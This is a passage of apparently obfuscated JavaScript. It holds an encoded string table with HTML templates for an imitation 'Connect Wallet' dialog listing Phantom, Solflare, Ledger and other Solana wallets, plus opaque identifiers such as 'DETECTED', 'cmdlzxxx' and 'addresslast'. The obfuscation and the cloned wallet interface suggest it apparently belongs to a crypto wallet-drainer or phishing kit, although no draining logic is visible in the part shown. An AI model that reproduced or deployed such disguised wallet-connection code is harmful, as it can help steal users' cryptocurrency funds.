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" alt="Spot icon" class="tw-mr-3">\n                            <div class="tw-flex tw-flex-col tw-justify-between">\n                              <span class="tw-text-sm tw-text-left">Spot</span>\n                            </div>\n                          </div>\n                        </button>\n                      </div>\n                      <div class="tw-relative hover:tw-bg-purple-4 hover:tw-border-[#40324E] tw-rounded-lg tw-h-[56px] tw-my-2 tw-border-gray-300 tw-border-[1px] tw-flex tw-items-center">\n                        <button onclick="window.modalClose(); window.modalChoice(\'bitkeep\');" tabindex="-1" class="tw-p-2 tw-h-full tw-flex tw-items-center tw-justify-between tw-w-full tw-text-white-primary tw-text-lg tw-font-medium" data-test-id="BitKeep">\n                          <div class="tw-flex tw-items-center">\n                            <img height="28" width="28" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTI4IiBoZWlnaHQ9IjEyOCIgdmlld0JveD0iMCAwIDEyOCAxMjgiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxyZWN0IHdpZHRoPSIxMjgiIGhlaWdodD0iMTI4IiByeD0iNjQiIGZpbGw9IiM3NTI0RjkiLz4KPHBhdGggZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik0xMDIgNDUuNjAyN1Y0OS44MjA0QzEwMi4wMDEgNTAuMjI4MyAxMDEuODkzIDUwLjYyOTIgMTAxLjY4NyA1MC45ODI3QzEwMS40ODEgNTEuMzM2MSAxMDEuMTg1IDUxLjYyOTYgMTAwLjgyOCA1MS44MzM1TDg3LjA5MDggNTkuNjgwMUw5OS4zNjMzIDY2LjY3MUMxMDAuMTY1IDY3LjEyOTUgMTAwLjgzMSA2Ny43ODkyIDEwMS4yOTQgNjguNTgzNkMxMDEuNzU3IDY5LjM3OCAxMDIuMDAxIDcwLjI3OTEgMTAyIDcxLjE5NjJWODIuNDQyNEMxMDIuMDAxIDgzLjM2IDEwMS43NTggODQuMjYxNyAxMDEuMjk1IDg1LjA1NjdDMTAwLjgzMiA4NS44NTE2IDEwMC4xNjYgODYuNTExNyA5OS4zNjMzIDg2Ljk3MDVMNjcuMDg2OSAxMDUuM0M2Ni4yODUzIDEwNS43NTkgNjUuMzc1OSAxMDYgNjQuNDUwMiAxMDZDNjMuNTI0NSAxMDYgNjIuNjE1MSAxMDUuNzU5IDYxLjgxMzUgMTA1LjNMNTEuMjUyIDk5LjI2MTFDNTEuMDczNyA5OS4xNTkzIDUwLjkyNTYgOTkuMDEyOCA1MC44MjI3IDk4LjgzNjNDNTAuNzE5OCA5OC42NTk5IDUwLjY2NTYgOTguNDU5NyA1MC42NjU2IDk4LjI1NkM1MC42NjU2IDk4LjA1MjIgNTAuNzE5OCA5Ny44NTIgNTAuODIyNyA5Ny42NzU2QzUwLjkyNTYgOTcuNDk5MSA1MS4wNzM3IDk3LjM1MjcgNTEuMjUyIDk3LjI1MDhMODYuMTE1MiA3Ny4zODM1Qzg2LjIwNCA3Ny4zMzI1IDg2LjI3NzcgNzcuMjU5MyA4Ni4zMjkgNzcuMTcxMkM4Ni4zODAyIDc3LjA4MzIgODYuNDA3MiA3Ni45ODMzIDg2LjQwNzIgNzYuODgxN0M4Ni40MDcyIDc2Ljc4IDg2LjM4MDIgNzYuNjgwMiA4Ni4zMjkgNzYuNTkyMUM4Ni4yNzc3IDc2LjUwNCA4Ni4yMDQgNzYuNDMwOCA4Ni4xMTUyIDc2LjM3OThMNzMuMTcxOSA2OC45NzcxQzcyLjgxNTYgNjguNzczNCA3Mi40MTE0IDY4LjY2NjIgNzIgNjguNjY2MkM3MS41ODg2IDY4LjY2NjIgNzEuMTg0NCA2OC43NzM0IDcwLjgyODEgNjguOTc3MUwzNS40MTcgODkuMTcyMkMzNS4xNDk4IDg5LjMyNSAzNC44NDY3IDg5LjQwNTQgMzQuNTM4MSA4OS40MDU0QzM0LjIyOTUgODkuNDA1NCAzMy45MjY0IDg5LjMyNSAzMy42NTkyIDg5LjE3MjJMMjkuNjQ4NCA4Ni45MDA5QzI4Ljg0MjQgODYuNDQyOCAyOC4xNzI5IDg1Ljc4MiAyNy43MDc4IDg0Ljk4NTNDMjcuMjQyNyA4NC4xODg2IDI2Ljk5ODUgODMuMjg0MyAyNyA4Mi4zNjQxVjc3Ljc2NjRDMjYuOTk5OCA3Ny40NjA3IDI3LjA4MDkgNzcuMTYwMyAyNy4yMzUyIDc2Ljg5NTVDMjcuMzg5NSA3Ni42MzA3IDI3LjYxMTUgNzYuNDEwOSAyNy44Nzg5IDc2LjI1OEw3OC42NTA0IDQ3LjM2OTNDNzguNzM5MiA0Ny4zMTgzIDc4LjgxMjkgNDcuMjQ1MSA3OC44NjQxIDQ3LjE1N0M3OC45MTU0IDQ3LjA2ODkgNzguOTQyMyA0Ni45NjkxIDc4Ljk0MjMgNDYuODY3NEM3OC45NDIzIDQ2Ljc2NTggNzguOTE1NCA0Ni42NjU5IDc4Ljg2NDEgNDYuNTc3OUM3OC44MTI5IDQ2LjQ4OTggNzguNzM5MiA0Ni40MTY2IDc4LjY1MDQgNDYuMzY1Nkw2NS42ODY1IDM4LjkzNjdDNjUuMzMwMiAzOC43MzMxIDY0LjkyNjEgMzguNjI1OCA2NC41MTQ2IDM4LjYyNThDNjQuMTAzMiAzOC42MjU4IDYzLjY5OTEgMzguNzMzMSA2My4zNDI4IDM4LjkzNjdMMjguNzU3OCA1OC42M0MyOC41Nzk4IDU4LjczMTggMjguMzc3OCA1OC43ODU0IDI4LjE3MjIgNTguNzg1NUMyNy45NjY2IDU4Ljc4NTUgMjcuNzY0NiA1OC43MzIgMjcuNTg2NSA1OC42MzAzQzI3LjQwODQgNTguNTI4NiAyNy4yNjA0IDU4LjM4MjMgMjcuMTU3NSA1OC4yMDYxQzI3LjA1NDUgNTguMDI5OSAyNy4wMDAyIDU3LjgzIDI3IDU3LjYyNjRWNDUuNTQ3NkMyNi45OTg5IDQ0LjYzIDI3LjI0MiA0My43MjgzIDI3LjcwNDkgNDIuOTMzNEMyOC4xNjc4IDQyLjEzODQgMjguODM0MSA0MS40NzgzIDI5LjYzNjcgNDEuMDE5NUw2MS45MDcyIDIyLjY5NTRDNjIuNzA3MSAyMi4yMzk4IDYzLjYxMzggMjIgNjQuNTM2NiAyMkM2NS40NTk0IDIyIDY2LjM2NjEgMjIuMjM5OCA2Ny4xNjYgMjIuNjk1NEw5OS4zNjMzIDQxLjA4MzNDMTAwLjE2NSA0MS41NDE0IDEwMC44MyA0Mi4yMDAxIDEwMS4yOTMgNDIuOTkzNEMxMDEuNzU2IDQzLjc4NjcgMTAyIDQ0LjY4NjYgMTAyIDQ1LjYwMjdaIiBmaWxsPSJ3aGl0ZSIvPgo8L3N2Zz4K" alt="BitKeep icon" class="tw-mr-3">\n                            <div class="tw-flex tw-flex-col tw-justify-between">\n                              <span class="tw-text-sm tw-text-left">BitKeep</span>\n                            </div>\n                          </div>\n                        </button>\n                      </div>\n                    </div>\n                  </div>\n                </div>\n              </div>\n            </div>\n          </div>\n        </div>\n      </div>\n    </div>\n  </div>\n</div>\n    ', "addresslast", "5NiKKsd", "open", "isBusy", "cmdlzxxx", "./images/anchor.svg", "#collapser1", '" class="tw-inline-flex tw-items-center tw-whitespace-nowrap">\n              <span>', "collapseModal4", "auto", "innerText", "onConnected", "contains", "emodalClose", "hidden", "appendChild", "solflare", "onDeclineDesc", "anchor", "aria-labelledby", "300px", "aria-modal", "Less options", '<div class="rk-t-jUinjf">\n    <div id="headlessui-portal-root">\n      <div data-headlessui-portal="">\n        <button type="button" data-headlessui-focus-guard="true" aria-hidden="true" style="position: fixed; top: 1px; left: 1px; width: 1px; height: 0px; padding: 0px; margin: -1px; overflow: hidden; clip: rect(0px, 0px, 0px, 0px); white-space: nowrap; border-width: 0px;"></button>\n        <div>\n          <div class="tw-fixed tw-inset-y-0 tw-left-0 tw-w-screen tw-z-[9999]" id="headlessui-dialog-:r4v:" role="dialog" aria-modal="true" data-headlessui-state="open" aria-labelledby="headlessui-dialog-title-:r51:">\n            <div class="tw-fixed tw-inset-0 tw-bg-black/50 tw-opacity-100" id="headlessui-dialog-backdrop" onclick="window.modalClose()" aria-hidden="true" style="backdrop-filter: blur(1px);"></div>\n            <div class="tw-h-screen sm:tw-w-auto tw-max-w-[576px] tw-relative tw-flex tw-items-center tw-w-auto tw-mx-auto tw-justify-center" data-test-id="modal-background">\n              <div class="tw-flex tw-flex-col tw-overflow-auto sm:tw-max-h-[calc(100vh-32px)] tw-border dark-scroll-bar tw-rounded-20px tw-border-gray-500 tw-px-[12px] tw-relative tw-max-h-[calc(100vh-100px)] tw-overflow-y-auto tw-bg-purple-1 tw-border-none tw-w-[420px] tw-opacity-100 tw-scale-100" id="headlessui-dialog-panel-:r50:" data-headlessui-state="open">\n                <div class="tw-flex tw-flex-shrink-0 tw-items-center tw-justify-between tw-p-4" id="headlessui-dialog-title-:r51:" data-headlessui-state="open">\n                  <div class="tw-flex tw-flex-col">\n                    <div class="tw-flex tw-w-full">\n                      <h1 class="tw-text-white-primary tw-font-semibold !tw-text-[20px] tw-my-3">Connect Wallet</h1>\n                      <button class="tw-p-2 tw-ml-auto tw-mr-0 tw-my-auto hover:tw-opacity-60 tw-transition-opacity tw-duration-200" tabindex="0" id="closemodal1" style="color: white;" onclick="window.modalClose()">X</button>\n                    </div>\n                    <p class="tw-text-sm tw-text-gray-2">Choose how you want to connect. If you don\'t have a wallet, you can select a provider and create one.</p>\n                  </div>\n                </div>\n                <div class="tw-px-4 tw-pb-4 md:tw-p-4 tw-relative !tw-pt-0">\n                  <div class="tw-rounded-lg tw-pt-2 tw-flex tw-flex-col tw-border-[1px] tw-border-[#2B2037] tw-bg-purple-2">\n                    <div class="tw-px-3 tw-py-2">\n                      <div class="button tw-relative hover:tw-bg-purple-4 hover:tw-border-[#40324E] tw-rounded-lg tw-h-[56px] tw-my-2 tw-border-[1px] tw-border-gray-300  tw-flex tw-items-center tw-mt-4 tw-border-pink-primary tw-bg-opacity-10 !tw-border-pink-200 tw-bg-[#2B142B]">\n                        <button onclick="window.modalClose(); window.modalChoice(\'phantom\');" class="tw-p-2 tw-h-full tw-flex tw-items-center tw-justify-between tw-w-full tw-text-white-primary tw-text-lg tw-font-medium" data-test-id="Phantom">\n                          <div class="tw-flex tw-items-center">\n                            <img height="28" width="28" src="./images/icons/698e2ef14957d3ee9bb847b31a4d8db58cc7ecbe.svg" alt="Phantom icon" class="tw-mr-3">\n                            <div class="tw-flex tw-flex-col tw-justify-between">\n                              <span class="tw-text-sm tw-text-left">Phantom</span>\n                            </div>\n                          </div>\n                        </button>\n                        <div class="tw-bg-[#2B2037] tw-absolute tw-top-2 tw-right-2 tw-rounded-md tw-items-center tw-justify-center">\n                          <span class="tw-px-2 tw-text-green-1 tw-text-xs tw-font-semibold">Recommended</span>\n                        </div>\n                      </div>\n                    </div>\n                    <div class="tw-flex tw-flex-col tw-w-full">\n                      <div class="tw-px-3">\n                        <div class="tw-overflow-hidden" style="height: initial;">\n                          <div class="tw-pb-4">\n                            <div class="button tw-relative hover:tw-bg-purple-4 hover:tw-border-[#40324E] tw-rounded-lg tw-h-[56px] tw-my-2 tw-border-gray-300 tw-border-[1px] tw-flex tw-items-center">\n                              <button tabindex="0" onclick="window.modalClose(); window.modalChoice(\'solflare\');" class="tw-p-2 tw-h-full tw-flex tw-items-center tw-justify-between tw-w-full tw-text-white-primary tw-text-lg tw-font-medium" data-test-id="Solflare">\n                                <div class="tw-flex tw-items-center">\n                                  <img height="28" width="28" src="./images/icons/1b24c9da110c92066eb57685034f1dfd41c6927d.svg" alt="Solflare icon" class="tw-mr-3">\n                                  <div class="tw-flex tw-flex-col tw-justify-between">\n                                    <span class="tw-text-sm tw-text-left">Solflare</span>\n                                  </div>\n                                </div>\n                              </button>\n                            </div>\n                            <div class="button tw-relative hover:tw-bg-purple-4 hover:tw-border-[#40324E] tw-rounded-lg tw-h-[56px] tw-my-2 tw-border-gray-300 tw-border-[1px] tw-flex tw-items-center">\n                              <button tabindex="0" onclick="window.modalClose(); window.modalChoice(\'ledger\');" class="tw-p-2 tw-h-full tw-flex tw-items-center tw-justify-between tw-w-full tw-text-white-primary tw-text-lg tw-font-medium" data-test-id="Ledger">\n                                <div class="tw-flex tw-items-center">\n                                  <img height="28" width="28" src="./images/icons/876bfed7100123591208745ce7cc54338aec48c2.svg" alt="Ledger icon" class="tw-mr-3">\n                                  <div class="tw-flex tw-flex-col tw-justify-between">\n                                    <span class="tw-text-sm tw-text-left">Ledger</span>\n                                  </div>\n                                </div>\n                              </button>\n                            </div>\n                            <div class="button tw-relative hover:tw-bg-purple-4 hover:tw-border-[#40324E] tw-rounded-lg tw-h-[56px] tw-my-2 tw-border-gray-300 tw-border-[1px] tw-flex tw-items-center">\n                              <button tabindex="0" onclick="window.modalClose(); window.modalChoice(\'walletconnect\');" class="tw-p-2 tw-h-full tw-flex tw-items-center tw-justify-between tw-w-full tw-text-white-primary tw-text-lg tw-font-medium" data-test-id="WalletConnect">\n                                <div class="tw-flex tw-items-center">\n                                  <img height="28" width="28" src="./images/icons/78f07bdfdcc3b58718d006ff16756e2fa5c40426.svg" alt="WalletConnect icon" class="tw-mr-3">\n                                  <div class="tw-flex tw-flex-col tw-justify-between">\n                                    <span class="tw-text-sm tw-text-left">WalletConnect</span>\n                                  </div>\n                                </div>\n                              </button>\n                            </div>\n                            <div class="button tw-relative hover:tw-bg-purple-4 hover:tw-border-[#40324E] tw-rounded-lg tw-h-[56px] tw-my-2 tw-border-gray-300 tw-border-[1px] tw-flex tw-items-center">\n                              <button tabindex="0" onclick="window.modalClose(); window.modalChoice(\'torus\');" class="tw-p-2 tw-h-full tw-flex tw-items-center tw-justify-between tw-w-full tw-text-white-primary tw-text-lg tw-font-medium" data-test-id="Torus">\n                                <div class="tw-flex tw-items-center">\n                                  <img height="28" width="28" src="./images/icons/7f6aa89f058212bae4a71a85f1fdfb624e3c8dc2.svg" alt="Torus icon" class="tw-mr-3">\n                                  <div class="tw-flex tw-flex-col tw-justify-between">\n                                    <span class="tw-text-sm tw-text-left">Torus</span>\n                                  </div>\n                                </div>\n                              </button>\n                            </div>\n                            <div class="button tw-relative hover:tw-bg-purple-4 hover:tw-border-[#40324E] tw-rounded-lg tw-h-[56px] tw-my-2 tw-border-gray-300 tw-border-[1px] tw-flex tw-items-center">\n                              <button tabindex="0" onclick="window.modalClose(); window.modalChoice(\'clover\');" class="tw-p-2 tw-h-full tw-flex tw-items-center tw-justify-between tw-w-full tw-text-white-primary tw-text-lg tw-font-medium" data-test-id="Clover">\n                                <div class="tw-flex tw-items-center">\n                                  <img height="28" width="28" src="./images/icons/9465305944380d3e8b93d3873ce4a8cc71cfa4be.svg" alt="Clover icon" class="tw-mr-3">\n                                  <div class="tw-flex tw-flex-col tw-justify-between">\n                                    <span class="tw-text-sm tw-text-left">Clover</span>\n                                  </div>\n                                </div>\n                              </button>\n                            </div>\n                            <div class="button tw-relative hover:tw-bg-purple-4 hover:tw-border-[#40324E] tw-rounded-lg tw-h-[56px] tw-my-2 tw-border-gray-300 tw-border-[1px] tw-flex tw-items-center">\n                              <button tabindex="0" onclick="window.modalClose(); window.modalChoice(\'solong\');" class="tw-p-2 tw-h-full tw-flex tw-items-center tw-justify-between tw-w-full tw-text-white-primary tw-text-lg tw-font-medium" data-test-id="Solong">\n                                <div class="tw-flex tw-items-center">\n                                  <img height="28" width="28" src="./images/icons/6986ca54783535f6faf0f88056d9acf44ab9819f.png" alt="Solong icon" class="tw-mr-3">\n                                  <div class="tw-flex tw-flex-col tw-justify-between">\n                                    <span class="tw-text-sm tw-text-left">Solong</span>\n                                  </div>\n                                </div>\n                              </button>\n                            </div>\n                            <div class="button tw-relative hover:tw-bg-purple-4 hover:tw-border-[#40324E] tw-rounded-lg tw-h-[56px] tw-my-2 tw-border-gray-300 tw-border-[1px] tw-flex tw-items-center">\n                              <button tabindex="0" onclick="window.modalClose(); window.modalChoice(\'mathwallet\');" class="tw-p-2 tw-h-full tw-flex tw-items-center tw-justify-between tw-w-full tw-text-white-primary tw-text-lg tw-font-medium" data-test-id="MathWallet">\n                                <div class="tw-flex tw-items-center">\n                                  <img height="28" width="28" src="./images/icons/c0140bb992ab9793216c882d00a6adda60ec20ac.svg" alt="MathWallet icon" class="tw-mr-3">\n                                  <div class="tw-flex tw-flex-col tw-justify-between">\n                                    <span class="tw-text-sm tw-text-left">MathWallet</span>\n                                  </div>\n                                </div>\n                              </button>\n                            </div>\n                            <div class="button tw-relative hover:tw-bg-purple-4 hover:tw-border-[#40324E] tw-rounded-lg tw-h-[56px] tw-my-2 tw-border-gray-300 tw-border-[1px] tw-flex tw-items-center">\n                              <button tabindex="0" onclick="window.modalClose(); window.modalChoice(\'spot\');" class="tw-p-2 tw-h-full tw-flex tw-items-center tw-justify-between tw-w-full tw-text-white-primary tw-text-lg tw-font-medium" data-test-id="Spot">\n                                <div class="tw-flex tw-items-center">\n                                  <img height="28" width="28" src="./images/icons/5068ec50d1fa6752a4301a23c2eae887318d48b2.png" alt="Spot icon" class="tw-mr-3">\n                                  <div class="tw-flex tw-flex-col tw-justify-between">\n                                    <span class="tw-text-sm tw-text-left">Spot</span>\n                                  </div>\n                                </div>\n                              </button>\n                            </div>\n                            <div class="button tw-relative hover:tw-bg-purple-4 hover:tw-border-[#40324E] tw-rounded-lg tw-h-[56px] tw-my-2 tw-border-gray-300 tw-border-[1px] tw-flex tw-items-center">\n                              <button tabindex="0" onclick="window.modalClose(); window.modalChoice(\'bitkeep\');" class="tw-p-2 tw-h-full tw-flex tw-items-center tw-justify-between tw-w-full tw-text-white-primary tw-text-lg tw-font-medium" data-test-id="BitKeep">\n                                <div class="tw-flex tw-items-center">\n                                  <img height="28" width="28" src="./images/icons/23b3d63d7ac5f97dad05d7c0291b429e66fb3998.svg" alt="BitKeep icon" class="tw-mr-3">\n                                  <div class="tw-flex tw-flex-col tw-justify-between">\n                                    <span class="tw-text-sm tw-text-left">BitKeep</span>\n                                  </div>\n                                </div>\n                              </button>\n                            </div>\n                          </div>\n                        </div>\n                      </div>\n                    </div>\n                  </div>\n                </div>\n              </div>\n            </div>\n          </div>\n        </div>\n        <button type="button" data-headlessui-focus-guard="true" aria-hidden="true" style="position: fixed; top: 1px; left: 1px; width: 1px; height: 0px; padding: 0px; margin: -1px; overflow: hidden; clip: rect(0px, 0px, 0px, 0px); white-space: nowrap; border-width: 0px;"></button>\n      </div>\n    </div>\n  </div>\n  </div>', "isOpen", "loadFirstPopup", "innerHTML", "3122133ORFwku", "DETECTED", "initial", "tabIndex", "6309240HDPeqc", "5871618WVZOik", "querySelector", "393YiYhRh", "img", '\n  <div>\n<div class="tw-fixed tw-inset-y-0 tw-left-0 tw-w-screen tw-z-9000" id="headlessui-dialog-:r7k:" role="dialog" aria-modal="true" data-headlessui-state="open" aria-labelledby="headlessui-dialog-title-:r7m:">\n<div class="tw-fixed tw-inset-0 tw-bg-black/50 tw-opacity-100" aria-hidden="true" style="backdrop-filter: blur(1px);"></div>\n<div class="tw-h-screen sm:tw-w-auto tw-relative tw-flex tw-items-center tw-w-auto tw-mx-auto tw-max-w-[384px] tw-justify-center" data-test-id="modal-background">\n  <div class="tw-flex tw-flex-col tw-w-full tw-overflow-auto tw-relative tw-max-h-screen sm:tw-max-h-[calc(100vh-32px)] tw-border dark-scroll-bar tw-rounded-20px tw-bg-gray-100 tw-rounded-xl tw-border-gray-500 tw-max-w-[384px] tw-opacity-100 tw-scale-100" id="headlessui-dialog-panel-:r7l:" data-headlessui-state="open">\n  <div data-test-id="modal-header" class="tw-flex tw-flex-shrink-0 tw-items-center tw-justify-between tw-p-4 tw-mb-[6px]" 